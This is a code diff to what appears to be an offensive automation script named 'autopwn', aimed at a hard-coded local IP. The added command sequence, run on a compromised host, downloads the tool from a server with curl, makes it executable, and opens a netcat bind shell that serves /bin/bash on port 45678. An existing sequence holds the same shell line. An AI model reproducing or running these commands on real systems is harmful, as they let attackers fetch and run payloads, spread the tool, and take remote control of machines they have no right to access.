@@ -40,7 +40,7 @@ LOG("Launched autopwn.", logfile, "inf")
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
 
-debug = 0
+debug = 1
 
 
 def show_pwnguin():
@@ -444,8 +444,17 @@ if __name__ == "__main__":
         "echo pwnguined",
         "nc -l -p 45678 -e /bin/bash",
     ]
+    sequence3 = [
+        "cd /root",
+        "pwd",
+        "ls",
+        "curl -s " + srv + "/post/autopwn -o autopwn > /dev/null",
+        "chmod 700 autopwn",
+        "echo pwnguined",
+        "nc -l -p 45678 -e /bin/bash",
+    ]
     sendCommands(shell, sequence)
-    sendCommands(shell, sequence2)
+    sendCommands(shell, sequence3)
 
     LOG("END OF LOGS", logfile, "crit")
     logfile.close()
